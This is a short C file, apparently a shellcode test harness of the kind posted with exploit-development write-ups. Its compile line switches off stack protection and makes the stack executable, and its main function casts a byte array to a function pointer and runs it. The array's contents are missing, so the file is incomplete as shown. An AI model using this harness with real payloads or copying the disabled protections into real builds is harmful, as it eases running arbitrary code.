// Author: Cameron, James
// Compile With: gcc test.c -fno-stack-protector -z execstack
// Tested On: Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
//            Ubuntu 12.04.4 LTS

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \


int main(){

	printf("[*]Executing shellcode of length: %d\n", strlen(shellcode));
	int (*run)() = (int(*)())shellcode;
	run();
	return 0;

}
